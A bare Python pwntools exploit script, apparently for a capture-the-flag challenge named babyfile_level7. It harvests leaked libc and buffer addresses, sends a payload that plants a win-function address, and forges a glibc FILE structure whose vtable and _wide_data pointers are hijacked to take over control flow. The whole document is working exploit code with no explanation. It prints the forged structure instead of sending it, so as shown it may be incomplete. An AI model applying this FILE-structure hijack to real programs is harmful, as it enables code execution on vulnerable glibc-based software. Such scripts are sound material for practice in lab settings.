from pwn import *
context(os='linux', arch='amd64', log_level='debug')
fp = FileStructure()
win_addr=0x4012E6
offset=0x38-24
puts_addr=0x712991da6420
_IO_wfile_jumps_addr=0x712991f0af60
p=process("/challenge/babyfile_level7")
p.recvuntil("puts() within libc is: 0x",drop=True)
puts_real_addr=int(p.recv(12),16)
print("[Leak]:puts_addr=",hex(puts_real_addr))
p.recvuntil("The name buffer is located at: 0x",drop=True)
hijack_vptr=int(p.recvuntil("\n",drop=True),16)
print("[Leak]:buf_addr=",hex(hijack_vptr))
p.recvuntil("_lock",drop=True)
p.recvuntil("0x",drop=True)
p.recvuntil("0x",drop=True)
lock_addr=int(p.recvuntil("\n",drop=True),16)
print("[Leak]:lock_addr=",hex(lock_addr))
buf_payload=b'\x00'*0x68+p64(win_addr)+b'\x00'*(0xe0-0x70)+p64(hijack_vptr)
p.sendafter("your name.",buf_payload)
vptr=_IO_wfile_jumps_addr-puts_addr+puts_real_addr-offset
#file_payload=b'\x00'*136+p64(lock_addr)+b'\x00'*16+p64(hijack_vptr)+b'\x00'*48+p64(vptr)
fp.vtable=vptr
fp._lock=lock_addr
fp._wide_data=hijack_vptr
print("payload=",bytes(fp))
p.interactive()
